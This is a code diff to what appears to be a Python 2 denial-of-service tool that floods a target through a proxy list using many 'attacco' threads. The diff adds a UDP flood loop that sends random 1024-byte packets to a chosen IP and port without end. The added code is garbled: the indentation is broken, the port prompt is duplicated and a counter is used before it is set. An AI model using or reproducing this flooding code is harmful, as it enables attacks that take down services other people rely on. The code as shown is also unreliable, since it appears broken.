@@ -327,6 +327,16 @@ in_file = open(raw_input("File Proxy ( proxy.txt ) : "),"r")
 proxyf = in_file.read()
 in_file.close()
  
+	sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
+bytes=random._urandom(1024) 
+port=input('Port(80) : ')#Port we direct to attack
+port=input('Port(53) : ')
+
+while 1: #Infinitely loops sending packets to the port until the program is exited.
+    sock.sendto(bytes,(ip,port))
+    print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
+    sent= sent + 1
+
 listaproxy = proxyf.split('\n')
 #So luong
 thread = input("Power ( 1000 ) : ") 
@@ -335,7 +345,7 @@ accept = "Accept-Encoding: gzip, deflate\r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
- 
+
 for x in xrange(thread):
     attacco().start()
     time.sleep(0.003)
